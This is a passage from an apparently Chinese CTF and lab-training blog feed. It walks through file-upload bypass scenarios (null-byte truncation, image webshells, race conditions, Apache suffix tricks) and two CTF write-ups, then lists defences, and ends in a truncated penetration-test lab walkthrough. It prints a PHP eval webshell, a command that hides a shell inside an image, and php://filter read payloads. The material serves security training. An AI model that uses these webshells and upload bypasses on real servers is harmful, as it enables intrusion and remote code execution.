substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr))&#123;        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path))&#123;            $is_upload = true;        &#125; else &#123;            $msg = &#39;上传出错！&#39;;        &#125;    &#125; else&#123;        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;    &#125;&#125;</code></pre><blockquote><p>截断条件：<br>php版本小于5.3.4 详情关注CVE-2006-7243<br>php的magic_quotes_gpc为OFF状态</p></blockquote><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861112.png" alt="Sample"></p><p>做题之前先要把网站中的php.ini中的安全设置修改一下。</p><blockquote><p>php.ini文件里的magic_quotes_gpc设成了off，那么PHP就不会在敏感字符前加上反斜杠（\）</p></blockquote><p>通过 上面的场景，黑名单虽然对很多的文件上传都做了限制，规定那些不能上传，但是总是有一些其他的方法可以实现绕过，所以黑名单是相对于白名单来说安全级别很低的。</p><p>这个场景是一个白名单。并且文件名是拼接而成。</p><pre><code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code></pre><p>可以通过截断上传（0x00，%00，&#x2F;00 ）实现。</p><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861113.png" alt="Sample"></p><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861114.png" alt="Sample"></p><hr><p><strong>场景十三</strong></p><pre><code>$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;]))&#123;    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr))&#123;        $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path = $_POST[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path))&#123;            $is_upload = true;        &#125; else &#123;            $msg = &quot;上传失败&quot;;        &#125;    &#125; else &#123;        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;    &#125;&#125;</code></pre><blockquote><p>可以看到文件路径中的$_GET[‘save_path’]变成了 $_POST[‘save_path’]。这又会造成什么区别呢？</p><p><strong>post不会像get对%00进行自动解码</strong></p><p>也就是说我们不能直接在包中直接加入截断字符了需要手动进行url编码处理。</p></blockquote><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861115.png" alt="Sample"></p><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861116.png" alt="Sample"></p><p>这里上传路径后加一个A是为了方便寻找我们需要修改的地方，也可以不加。</p><p>成功上传图片马。</p><hr><p><strong>场景十四</strong></p><p>这题是上传图片马，但是想要利用图片马还需要结合文件包含漏洞，所以本题只需要上传三种图片格式的文件码就行了。</p><p>制作图片马方法：</p><pre><code>copy normal.jpg /b + shell.php /a webshell.jpg</code></pre><p>直接通过抓包改包也可以直接上传只修改了后缀的一句话木马php文件。</p><hr><p><strong>场景十五</strong></p><p>通过getimagesize()函数来实现对文件类型的识别判断。也就是说用burpsuit改包的方法操作就复杂了，直接合成一张木马图上传即可(与十四相同)</p><hr><p><strong>场景十六</strong></p><p>通过函数exif_imagetype()函数获得图片文件的类型，从而实现文件白名单的过滤操作。不能抓包改包实现，依旧使用图片马合成。</p><hr><p><strong>场景十七</strong></p><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861117.png" alt="Sample"></p><p>要通过二次渲染来上传图片文件，所以普通的图片马不能顺利上传，需要是使用二次渲染绕过（见上文知识点），制作后和前面场景一样直接上传图片即可完成。</p><hr><p><strong>场景十八</strong></p><p>这是一个条件竞争的场景</p><pre><code>$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;]))&#123;    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);    $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name;    if(move_uploaded_file($temp_file, $upload_file))&#123;        if(in_array($file_ext,$ext_arr))&#123;             $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;             rename($upload_file, $img_path);             $is_upload = true;        &#125;else&#123;            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;            unlink($upload_file);        &#125;    &#125;else&#123;        $msg = &#39;上传出错！&#39;;    &#125;&#125;</code></pre><p>先将文件上传到服务器，然后通过rename修改名称，再通过unlink删除修改名称后的文件，这里可以通过条件竞争的方式在unlink之前，访问webshell。<br>首先在burp中不断发送上传webshell的数据包即可。（参考上述知识点9条件竞争）</p><p>为什么可以这样操作呢？之前的场景为什么不行呢？我们可以仔细看到这里的代码是不一样的构造。</p><pre><code>$is_upload = false;$msg = null;if(isset($_POST[&#39;submit&#39;]))&#123;    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);    $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name;    if(move_uploaded_file($temp_file, $upload_file))&#123;        if(in_array($file_ext,$ext_arr))&#123;             $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;             rename($upload_file, $img_path);             $is_upload = true;        &#125;else&#123;            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;            unlink($upload_file);        &#125;    &#125;else&#123;        $msg = &#39;上传出错！&#39;;    &#125;&#125;</code></pre><p>其实这个代码都没啥大问题，执行下来都是OK的，但是这里是这样操作的，先通过move_uploaded_file把文件保存了，然后再去判断后缀名是否合法，合法就重命名，如果不合法再删除。重是重点在于，在多线程情况下，就有可能出现还没处理完，我们就访问了原文件，这样就会导致被绕过防护。下面是我随便找的之前的某一关，很明显看到之前代码是先改名，再移动保存。所以可以用条件竞争打他个措手不及，使得文件保存了但是没能及时处理。</p><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861218.png" alt="在这里插入图片描述"></p><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861219.png" alt="Sample"></p><hr><p><strong>场景十九</strong></p><pre><code>&lt;li id=&quot;show_code&quot;&gt;    &lt;h3&gt;index.php代码&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;line-numbers language-php&quot;&gt;//index.php$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;]))&#123;    require_once(&quot;./myupload.php&quot;);    $imgFileName =time();    $u = new MyUpload($_FILES[&#39;upload_file&#39;][&#39;name&#39;], $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $_FILES[&#39;upload_file&#39;][&#39;size&#39;],$imgFileName);    $status_code = $u-&gt;upload(UPLOAD_PATH);    switch ($status_code) &#123;        case 1:            $is_upload = true;            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;            break;        case 2:            $msg = &#39;文件已经被上传，但没有重命名。&#39;;            break;         case -1:            $msg = &#39;这个文件不能上传到服务器的临时文件存储目录。&#39;;            break;         case -2:            $msg = &#39;上传失败，上传目录不可写。&#39;;            break;         case -3:            $msg = &#39;上传失败，无法上传该类型文件。&#39;;            break;         case -4:            $msg = &#39;上传失败，上传的文件过大。&#39;;            break;         case -5:            $msg = &#39;上传失败，服务器已经存在相同名称文件。&#39;;            break;         case -6:            $msg = &#39;文件无法上传，文件不能复制到目标目录。&#39;;            break;              default:            $msg = &#39;未知错误！&#39;;            break;    &#125;&#125;//myupload.phpclass MyUpload&#123;..................   var $cls_arr_ext_accepted = array(      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );..................    /** upload()   **   ** Method to upload the file.   ** This is the only method to call outside the class.   ** @para String name of directory we upload to   ** @returns void  **/  function upload( $dir )&#123;        $ret = $this-&gt;isUploadedFile();        if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );    &#125;    $ret = $this-&gt;setDir( $dir );    if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );    &#125;    $ret = $this-&gt;checkExtension();    if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );    &#125;    $ret = $this-&gt;checkSize();    if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );        &#125;        // if flag to check if the file exists is set to 1        if( $this-&gt;cls_file_exists == 1 )&#123;            $ret = $this-&gt;checkFileExists();      if( $ret != 1 )&#123;        return $this-&gt;resultUpload( $ret );          &#125;    &#125;    // if we are here, we are ready to move the file to destination    $ret = $this-&gt;move();    if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );        &#125;    // check if we need to rename the file    if( $this-&gt;cls_rename_file == 1 )&#123;      $ret = $this-&gt;renameFile();      if( $ret != 1 )&#123;        return $this-&gt;resultUpload( $ret );          &#125;    &#125;        // if we are here, everything worked as planned :)    return $this-&gt;resultUpload( &quot;SUCCESS&quot; );    &#125;.................. &#125;;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;</code></pre><blockquote><p>根据apache的后缀名识别漏洞：从右往左依次识别后缀，遇到不能识别的后缀名便跳过 ，因此可以文件名改为</p><p>1.php.7z,然后利用bs 快速发包，</p><p>本关对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，因为move在rename之前，move操作进行了一次文件保存，然后rename进行了一次更改文件名，由于条件竞争，程序会出现来不及rename的问题，从而上传成功</p></blockquote><p>所以本题相对上题是差不多的，只不过多了一部操作而已：增加Apache的解析识别漏洞（后缀冗余）</p><blockquote><p>（1）利用Apache 的漏洞，将webshell 脚本文件名改为1.php.7z （白名单中 有.7z 这个apache 不能识别的后缀，所以用.7z)</p><p>然后利用bs 去不断快速发包，实现条件竞争，进而保留了脚本名，使apache 将其识别为1.php</p><p>（2）单纯利用 条件竞争，利用bs 去不断快速发包，实现条件竞争，进而保留了图片马的文件名，成功绕过</p></blockquote><hr><p><strong>场景二十</strong></p><pre><code>$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);        $file_name = $_POST[&#39;save_name&#39;];        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);        if(!in_array($file_ext,$deny_ext)) &#123;            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                 $is_upload = true;            &#125;else&#123;                $msg = &#39;上传出错！&#39;;            &#125;        &#125;else&#123;            $msg = &#39;禁止保存为该类型文件！&#39;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><p>是个黑名单的限制</p><ol><li>看了一些黑名单，发现程序中没有大小写统一，后缀用大小写绕过。one.phP,成功上传。。。。可能是非预期解，要不然为什么放低二十关，黑名单真的不安全。。一不小心就漏了什么。</li><li>也是一个文件名路径拼接的问题，可以用场景十二中的字符串截断来实现绕过（0x00、%00）。</li><li>递归删除文件名最后的&#x2F;.导致绕过了后缀名检测,在bs中将文件名改为：1.php&#x2F;. 成功绕过。</li></ol><hr><p><strong>场景二十一</strong></p><pre><code>$is_upload = false;$msg = null;if(!empty($_FILES[&#39;upload_file&#39;]))&#123;    //检查MIME    $allow_type = array(&#39;image/jpeg&#39;,&#39;image/png&#39;,&#39;image/gif&#39;);    if(!in_array($_FILES[&#39;upload_file&#39;][&#39;type&#39;],$allow_type))&#123;        $msg = &quot;禁止上传该类型文件!&quot;;    &#125;else&#123;        //检查文件名        $file = empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;];        if (!is_array($file)) &#123;            $file = explode(&#39;.&#39;, strtolower($file));        &#125;        $ext = end($file);        $allow_suffix = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);        if (!in_array($ext, $allow_suffix)) &#123;            $msg = &quot;禁止上传该后缀文件!&quot;;        &#125;else&#123;            $file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];            $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $msg = &quot;文件上传成功！&quot;;                $is_upload = true;            &#125; else &#123;                $msg = &quot;文件上传失败！&quot;;            &#125;        &#125;    &#125;&#125;else&#123;    $msg = &quot;请选择要上传的文件！&quot;;&#125;</code></pre><p>end函数取所post参数数组中的最后一个值，$ file_name &#x3D; reset($ file) . ‘.’ . $ file[count($ file) - 1]我们可以post一个参数名为一个[0]一个[2]，然后$ file[count($ file) - 1]就为空，$ file_name最终就为reset($ file)即$ file[0]，就可以绕过判断。</p><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861220.png" alt="在这里插入图片描述"></p><hr><p>就此该靶场二十一个关卡就已经全部完成了。相比你对整个文件上传有了大概了理解，还是建议下载靶场自己进行实践操作才能对知识有很好的吸收。</p><hr><hr><h3 id="CTF实战-知识补充"><a href="#CTF实战-知识补充" class="headerlink" title="CTF实战-知识补充"></a>CTF实战-知识补充</h3><p>下面两题是CTF实例题目，并且知识点是上面没有包含的，在这补充，并且作为一个巩固练习。</p><hr><h4 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h4><p><a href="http://web.jarvisoj.com:32785/">题目链接</a></p><p>1.先改文件名，无效，不是前端校验。</p><p>2.再改Content-Type，无效。</p><p>3.有因为限制是图片上传，所以肯定是图片马了。制作一个图片马。</p><pre><code>&lt;?php@eval($_POST[&#39;cmd&#39;]);?&gt;</code></pre><p>4.上传成功。尝试连接？发现奇怪后缀~~</p><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861221.png" alt="在这里插入图片描述"><br>5.尝试截断。打开发现。。。不让操作。<br><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861222.png" alt="在这里插入图片描述"><br>6.可能是php一句话的什么被过滤了，换用：</p><pre><code>&lt;script language=&quot;php&quot;&gt;@eval_r($_POST[&#39;cmd&#39;])&lt;/script&gt;</code></pre><p><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861223.png" alt="在这里插入图片描述"><br><img src="/../pic/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzkwNzAz,size_16,color_FFFFFF,t_70-167983885861224.png" alt="在这里插入图片描述"><br>7.重复操作，得到flag！</p><hr><h4 id="bugku-ctf之文件上传2"><a href="#bugku-ctf之文件上传2" class="headerlink" title="bugku ctf之文件上传2"></a>bugku ctf之文件上传2</h4><p>湘湖杯比赛题，环境目前没找到，在很多安全题库的平台应该有，我没有去翻，先看两种思路。</p><blockquote><p>参考：<a href="https://www.jianshu.com/p/bf45138d4e13">https://www.jianshu.com/p/bf45138d4e13</a> <a href="https://www.jianshu.com/p/59730b290120">https://www.jianshu.com/p/59730b290120</a></p></blockquote><p>1.打开网站，是一个上传文件的网页，那我们先按照要求上传png文件试试，上传图片说打不开图片，陷入迷茫。那应该不是靠一句话菜刀，因为根本加载不出来，我觉得不可能没有php代码，于是在op后面构造</p><p>op&#x3D;index.php 提示我们不存在这样的页面 但事实是存在的</p><p>op&#x3D;index 没有出现提示 但页面是空的</p><p>op&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index</p><p>结果得到下面代码</p><pre><code>&lt;?phperror_reporting(0);define(&#39;FROM_INDEX&#39;, 1);$op = empty($_GET[&#39;op&#39;]) ? &#39;home&#39; : $_GET[&#39;op&#39;];if(!is_string($op) || preg_match(&#39;/\.\./&#39;, $op))    die(&#39;Try it again and I will kill you! I freaking hate hackers!&#39;);ob_start(&#39;ob_gzhandler&#39;);function page_top($op) &#123;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;title&gt;Panduploader::&lt;?= htmlentities(ucfirst($op)); ?&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;header&quot;&gt;&lt;center&gt;&lt;a href=&quot;?op=home&quot; class=&quot;logo&quot;&gt;&lt;img src=&quot;images/logo.jpg&quot; alt=&quot;&quot;&gt;&lt;/a&gt;&lt;/center&gt;&lt;/div&gt;&lt;div id=&quot;body&quot;&gt;&lt;?php&#125;function fatal($msg) &#123;?&gt;&lt;div class=&quot;article&quot;&gt;&lt;h2&gt;Error&lt;/h2&gt;&lt;p&gt;&lt;?=$msg;?&gt;&lt;/p&gt;&lt;/div&gt;&lt;?phpexit(1);&#125;function page_bottom() &#123;?&gt;    &lt;/div&gt;    &lt;center&gt;&lt;div id=&quot;footer&quot;&gt;&lt;div&gt;&lt;p&gt;&lt;span&gt;2017 &amp;copy; &lt;/span&gt; All rights reserved.&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpob_end_flush();&#125;register_shutdown_function(&#39;page_bottom&#39;);page_top($op);if(!(include $op . &#39;.php&#39;))    fatal(&#39;no such page&#39;);?&gt;        //缩短长度把转行都去了</code></pre><p>通过这个分析，大概懂了为什么文件加.php提醒没有此页面的原因。</p><p>通过御剑后台扫描扫描出后台的信息，有flag.php页面，则</p><p>op&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag</p><p>则获得flag的base64加密后的数据，进行解密，获得flag。</p><p>2.看到file还有题目名就想包含一下，当然是尝试的flag.php，结果什么都没有，用php:&#x2F;&#x2F;filter试试发现作者已经过滤了。右键源码看到upload.php上传文件名为1.php;.jpg，绕过检测，包含一下发现一句话的<?php?>这些字符被过滤，从其他文章处看到构造了上传得到flag</p><p>3.尝试构造payload来进行测试php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag得到的结果再在base64解码就可以得到flag了</p><p>4.点开链接发现什么都没有用御剑扫一下后台看看有没有隐藏文件其他php文件打开都是空页，index.php打开没什么不一样，下载111.zip用phpstorm打开，得到flag发现这就是个文件。</p><hr><hr><h3 id="文件上传漏洞防御"><a href="#文件上传漏洞防御" class="headerlink" title="文件上传漏洞防御"></a>文件上传漏洞防御</h3><p><strong>首先，上传的文件能够被Web容器解释执行。所以文件上传后所在的目录要是Web容器所覆盖到的路径。<br>其次，用户能够从Web上访问这个文件。如果文件上传了，但用户无法通过Web访问，或者无法得到Web容器解释这个脚本，那么也不能称之为漏洞。<br>最后，用户上传的文件若被安全检查、格式化、图片压缩等功能改变了内容，则也可能导致攻击不成功。</strong><br>防范文件上传漏洞常见的几种方法：</p><p>1.文件上传的目录设置为不可执行<br><strong>只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。</strong></p><p>2.判断文件类型<br><strong>在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。</strong></p><p>3.使用随机数改写文件名和文件路径<br><strong>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。</strong></p><p>4.单独设置文件服务器的域名<br><strong>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含<a href="https://link.jianshu.com/?t=http://www.2cto.com/kf/ware/Java/">Java</a>script的XSS利用等问题将得到解决。</strong></p><p><strong>系统开发阶段的防御</strong><br>系统开发人员应有较强的安全意识，尤其是采用PHP语言开发系统。在系统开发阶段应充分考虑系统的安全性。对文件上传漏洞来说，最好能在客户端和服务器端对用户上传的文件名和文件路径等项目分别进行严格的检查。客户端的检查虽然对技术较好的攻击者来说可以借助工具绕过，但是这也可以阻挡一些基本的试探。服务器端的检查最好使用白名单过滤的方法，这样能防止大小写等方式的绕过，同时还需对%00截断符进行检测，对HTTP包头的content-type也和上传文件的大小也需要进行检查。<br><strong>系统运行阶段的防御</strong><br>系统上线后运维人员应有较强的安全意思，积极使用多个安全检测工具对系统进行安全扫描，及时发现潜在漏洞并修复。定时查看系统日志，web服务器日志以发现入侵痕迹。定时关注系统所使用到的第三方插件的更新情况，如有新版本发布建议及时更新，如果第三方插件被爆有安全漏洞更应立即进行修补。对于整个网站都是使用的开源代码或者使用网上的框架搭建的网站来说，尤其要注意漏洞的自查和软件版本及补丁的更新，上传功能非必选可以直接删除。除对系统自生的维护外，服务器应进行合理配置，非必选一般的目录都应去掉执行权限，上传目录可配置为只读。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试</title>
      <link href="/2023/03/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2023/03/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="测试1"><a href="#测试1" class="headerlink" title="测试1"></a>测试1</h1><h2 id="阶段1-Web站点渗透控制"><a href="#阶段1-Web站点渗透控制" class="headerlink" title="阶段1: Web站点渗透控制"></a>阶段1: Web站点渗透控制</h2><h4 id="任务1-端口扫描获取后台地址"><a href="#任务1-端口扫描获取后台地址" class="headerlink" title="任务1: 端口扫描获取后台地址"></a>任务1: 端口扫描获取后台地址</h4><p>题解:<br>打开<code>Kali_MissionKit</code>操作机，在桌面新建终端，使用<code>nmap</code>工具扫描<code>192.168.2.100</code>开放的端口：</p><pre><code class="apache">nmap -Pn -sT 192.168.2.100 -p 80,8080,1433,3389,1525,3306</code></pre><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/e707a0547b6a4e14bb50603a54099922.png" alt="img"></p><p>可以看到目标开放了3389，80端口，在<code>Win10_MissionKit</code>操作机中使用浏览器访问该地址的80端口，可以看到目标主机开放web应用：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/68e5a86438c844ef9648d5e733e654a3.png" alt="img"></p><p>通过观察我们可以发现该站点用了一套<code>atomaticms</code>系统，<code>Kali_MissionKit</code>操作机的桌面有对应的源码文件夹，进入源码文件夹对<code>atomaticms</code>系统的文件结构进行检查，发现疑似后台管理员登录地址：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/0b5adc56708544d0822f2b5930a18c50.png" alt="img"></p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/e93fbcecac4a44b392c12ecebc54ef53.png" alt="img"></p><p><code>Kali_MissionKit</code>操作机打开浏览器：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/0fa52e0326b644f285f3337df8423f12.png" alt="img"></p><p>访问<code>http://192.168.2.100/acms_adminlogin.asp</code>，发现目标站点的后台登录口：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/f11ea2c0aed84ee99af70c97bac10f8e.png" alt="img"></p><h4 id="任务2-暴力破解登录密码"><a href="#任务2-暴力破解登录密码" class="headerlink" title="任务2: 暴力破解登录密码"></a>任务2: 暴力破解登录密码</h4><p>题解:<br><code>Kali_MissionKit</code>操作机中设置浏览器的代理：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/a8051f5a62094f6b9bf39f66a2fba4a3.png" alt="img"></p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/917d91c97e1d4f158788cf8d217032ba.png" alt="img"></p><p>代理地址和端口如下，配置完成后点击<code>OK</code>：</p><p><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/ad21f72c0266440080afcf75c8d28f71.png" alt="img"></p><p>在<code>Kali_MissionKit</code>操作机的终端输入<code>burpsuite</code> 启动<code>Burpsuite </code>抓包工具：<br><img src="/../pic/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.assets/17fc4ae3c8454f75a607bf53ee4981a5.png" alt="img"></p><p><img 